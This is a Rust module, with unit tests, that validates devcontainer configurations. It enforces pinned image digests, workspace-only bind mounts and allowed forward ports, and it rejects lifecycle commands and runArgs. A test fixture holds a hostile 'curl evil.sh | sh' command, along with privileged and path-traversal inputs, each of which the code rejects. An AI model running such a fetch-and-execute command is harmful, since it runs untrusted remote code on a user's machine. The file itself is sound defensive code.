//! Parse the pinned-image, mount, environment and port allowlist; reject lifecycle commands and features outside the approved subset.

use std::collections::BTreeMap;

use serde::Deserialize;
use thiserror::Error;

#[derive(Debug, Error)]
pub enum DevcontainerError {
    #[error("missing devcontainer.json at {0}")]
    Missing(String),
    #[error("invalid JSON: {0}")]
    Json(#[from] serde_json::Error),
    #[error("image must be a pinned sha256 digest (got {0:?})")]
    UnpinnedImage(String),
    #[error("features are not supported in the safe subset")]
    FeaturesUnsupported,
    #[error("lifecycle commands require explicit owner approval (field {0})")]
    LifecycleCommandUnapproved(String),
    #[error("mount {0:?} is outside the project workspace")]
    UnsafeMount(String),
    #[error("forward port {0} out of range")]
    InvalidPort(u16),
    #[error("working folder {0:?} must be a relative path")]
    UnsafeWorkingFolder(String),
}

/// A validated plan the runtime agrees to launch (§42.3).
#[derive(Debug, Clone, PartialEq)]
pub struct DevcontainerPlan {
    /// Digest-pinned base image (`repo@sha256:<hex>`).
    pub image_digest: String,
    /// Represent source/target mounts with sources restricted to the project workspace.
    pub mounts: Vec<String>,
    pub env: BTreeMap<String, String>,
    /// Expose container ports through loopback preview forwarding only after explicit registration.
    pub forward_ports: Vec<u16>,
    /// Optional working directory inside the container.
    pub workspace_folder: Option<String>,
    /// Optional single command (no shell interpolation by the launcher).
    pub command: Option<String>,
}

#[derive(Debug, Deserialize, Default)]
struct RawDevcontainer {
    image: Option<String>,
    #[serde(default)]
    features: serde_json::Value,
    #[serde(default, rename = "onCreateCommand")]
    on_create_command: Option<serde_json::Value>,
    #[serde(default, rename = "postCreateCommand")]
    post_create_command: Option<serde_json::Value>,
    #[serde(default, rename = "postStartCommand")]
    post_start_command: Option<serde_json::Value>,
    #[serde(default)]
    mounts: Vec<String>,
    #[serde(default)]
    env: BTreeMap<String, String>,
    #[serde(default, rename = "forwardPorts")]
    forward_ports: Vec<u16>,
    #[serde(default, rename = "workspaceFolder")]
    workspace_folder: Option<String>,
    #[serde(default, rename = "runArgs")]
    run_args: Vec<String>,
}

/// Read and validate `.devcontainer/devcontainer.json` inside `project_dir`.
pub fn load_plan(project_dir: &std::path::Path) -> Result<DevcontainerPlan, DevcontainerError> {
    let path = project_dir.join(".devcontainer/devcontainer.json");
    let text = std::fs::read_to_string(&path)
        .map_err(|_| DevcontainerError::Missing(path.display().to_string()))?;
    parse(text.as_str())
}

pub fn parse(text: &str) -> Result<DevcontainerPlan, DevcontainerError> {
    let raw: RawDevcontainer = serde_json::from_str(text)?;

    // Digest-pinned image is mandatory (§42.3 "pin base-image digests").
    let image = raw
        .image
        .ok_or_else(|| DevcontainerError::Missing("image key".to_owned()))?;
    let digest_ok = image.rsplit_once('@').is_some_and(|(_, digest)| {
        digest.starts_with("sha256:")
            && digest.len() == 71
            && digest[7..].chars().all(|c| c.is_ascii_hexdigit())
    });
    if !digest_ok {
        return Err(DevcontainerError::UnpinnedImage(image));
    }

    if !raw.features.is_null() {
        return Err(DevcontainerError::FeaturesUnsupported);
    }
    for (field, present) in [
        ("onCreateCommand", raw.on_create_command.is_some()),
        ("postCreateCommand", raw.post_create_command.is_some()),
        ("postStartCommand", raw.post_start_command.is_some()),
    ] {
        if present {
            return Err(DevcontainerError::LifecycleCommandUnapproved(
                field.to_owned(),
            ));
        }
    }
    if !raw.run_args.is_empty() {
        // runArgs can smuggle --privileged / socket mounts; reject in v1.
        return Err(DevcontainerError::LifecycleCommandUnapproved(
            "runArgs".to_owned(),
        ));
    }

    // Allow workspace-relative bind sources only, rejecting traversal, named volumes and host paths outside the workspace.
    let mut mounts = Vec::new();
    for mount in &raw.mounts {
        let mut fields = std::collections::HashMap::new();
        for part in mount.split(',') {
            let (key, value) = part
                .split_once('=')
                .ok_or_else(|| DevcontainerError::UnsafeMount(mount.clone()))?;
            if !matches!(key, "type" | "source" | "target" | "readonly")
                || fields.insert(key, value).is_some()
            {
                return Err(DevcontainerError::UnsafeMount(mount.clone()));
            }
        }
        let source = fields.get("source").copied().unwrap_or("");
        let target = fields.get("target").copied().unwrap_or("");
        let safe_source = ["${localWorkspaceFolder}", "${containerWorkspaceFolder}"]
            .iter()
            .any(|prefix| {
                source == *prefix
                    || source
                        .strip_prefix(prefix)
                        .is_some_and(|rest| rest.starts_with('/'))
            });
        // Mount only workspace children so extra mounts cannot replace the workspace root, executables or configuration.
        if fields.get("type") != Some(&"bind")
            || !safe_source
            || !target.starts_with("/workspace/")
            || target.split('/').skip(1).any(str::is_empty)
            || mount.chars().any(char::is_control)
            || source
                .split('/')
                .chain(target.split('/'))
                .any(|part| matches!(part, "." | ".."))
            || fields
                .get("readonly")
                .is_some_and(|value| !matches!(*value, "true" | "false"))
        {
            return Err(DevcontainerError::UnsafeMount(mount.clone()));
        }
        mounts.push(mount.clone());
    }

    for port in &raw.forward_ports {
        // Reject port zero and every runtime-owned loopback port so previews cannot squat or front a runtime service.
        if *port == 0 || spark_core::is_runtime_owned_port(*port) {
            return Err(DevcontainerError::InvalidPort(*port));
        }
    }

    // Allow absolute container workspace paths but reject home-relative and traversal paths.
    let workspace_folder = match raw.workspace_folder {
        None => None,
        Some(folder) if folder.starts_with('~') || folder.split('/').any(|seg| seg == "..") => {
            return Err(DevcontainerError::UnsafeWorkingFolder(folder));
        }
        Some(folder) => Some(folder),
    };

    Ok(DevcontainerPlan {
        image_digest: image,
        mounts,
        env: raw.env,
        forward_ports: raw.forward_ports,
        workspace_folder,
        command: None, // lifecycle commands unapproved in the safe subset
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pinned_image_and_mounts_parse() {
        let plan = parse(
            r#"{
              "image": "nvcr.io/nvidia/cuda@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
              "mounts": ["type=bind,source=${localWorkspaceFolder}/src,target=/workspace/src"],
              "env": {"FOO": "bar"},
              "forwardPorts": [5173],
              "workspaceFolder": "/workspace/app"
            }"#,
        )
        .unwrap();
        assert!(plan.image_digest.contains("sha256:"));
        assert_eq!(plan.forward_ports, vec![5173]);
        assert_eq!(plan.env.get("FOO").map(String::as_str), Some("bar"));
    }

    #[test]
    fn unpinned_image_is_rejected() {
        let err = parse(r#"{"image": "nvcr.io/nvidia/cuda:latest"}"#).unwrap_err();
        assert!(matches!(err, DevcontainerError::UnpinnedImage(_)));
    }

    #[test]
    fn lifecycle_commands_are_rejected_without_approval() {
        let err = parse(
            r#"{"image": "nvcr.io/nvidia/cuda@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                "postCreateCommand": "curl evil.sh | sh"}"#,
        )
        .unwrap_err();
        assert!(matches!(
            err,
            DevcontainerError::LifecycleCommandUnapproved(_)
        ));
    }

    #[test]
    fn features_and_run_args_are_rejected() {
        assert!(matches!(
            parse(
                r#"{"image": "i@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                    "features": {"ghcr.io/foo/bar": {}}}"#
            )
            .unwrap_err(),
            DevcontainerError::FeaturesUnsupported
        ));
        assert!(parse(
            r#"{"image": "i@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                "runArgs": ["--privileged"]}"#
        )
        .is_err());
    }

    #[test]
    fn traversal_mounts_and_ports_are_rejected() {
        assert!(matches!(
            parse(
                r#"{"image": "i@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                    "mounts": ["source=../escape,target=/etc"]}"#
            )
            .unwrap_err(),
            DevcontainerError::UnsafeMount(_)
        ));
        assert!(parse(
            r#"{"image": "i@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                "forwardPorts": [0]}"#
        )
        .is_err());
    }

    /// Ports the runtime's own services bind are refused too, so a project can neither squat nor front them.
    #[test]
    fn runtime_service_ports_cannot_be_forwarded() {
        for port in spark_core::RUNTIME_SERVICE_PORTS {
            let source = format!(
                r#"{{"image": "i@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                    "forwardPorts": [{port}]}}"#
            );
            assert!(
                matches!(parse(&source).unwrap_err(), DevcontainerError::InvalidPort(p) if p == port),
                "port {port} must be refused"
            );
        }
    }

    /// Project forwarding must neither occupy reserved engine ports nor bypass inference's two-path proxy allowlist (ADR-006).
    #[test]
    fn reserved_engine_ports_cannot_be_forwarded() {
        for port in [
            spark_core::RESERVED_ENGINE_PORT_RANGE_START,
            18150,
            spark_core::RESERVED_ENGINE_PORT_RANGE_END,
        ] {
            let source = format!(
                r#"{{"image": "i@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                    "forwardPorts": [{port}]}}"#
            );
            assert!(
                matches!(parse(&source).unwrap_err(), DevcontainerError::InvalidPort(p) if p == port),
                "port {port} must be refused"
            );
        }
    }

    /// Allow ports immediately outside the documented reserved range.
    #[test]
    fn ports_outside_the_reserved_range_are_still_allowed() {
        for port in [
            spark_core::RESERVED_ENGINE_PORT_RANGE_START - 1,
            spark_core::RESERVED_ENGINE_PORT_RANGE_END + 1,
        ] {
            let source = format!(
                r#"{{"image": "i@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                    "forwardPorts": [{port}]}}"#
            );
            assert_eq!(parse(&source).unwrap().forward_ports, vec![port]);
        }
    }
}

#[cfg(test)]
mod glm_mounts {
    #[test]
    fn mount_type_and_target_must_be_safe() {
        for mount in [
            "source=${localWorkspaceFolder}/src,target=/workspace/src",
            "type=volume,source=${localWorkspaceFolder}/src,target=/workspace/src",
            "type=bind,source=${localWorkspaceFolder}/src,target=relative",
            "type=bind,source=${localWorkspaceFolder}/src,target=/etc",
            "type=bind,source=${localWorkspaceFolder}/src,target=/workspace//",
            "type=bind,source=${localWorkspaceFolder}/src,target=/workspace/./src",
            "type=bind,source=${localWorkspaceFolder}outside,target=/workspace/src",
            "type=bind,type=volume,source=${localWorkspaceFolder}/src,target=/workspace/src",
        ] {
            let raw = serde_json::json!({"image": format!("example/image@sha256:{}", "a".repeat(64)), "mounts": [mount]});
            assert!(super::parse(&raw.to_string()).is_err(), "{mount}");
        }
    }
}
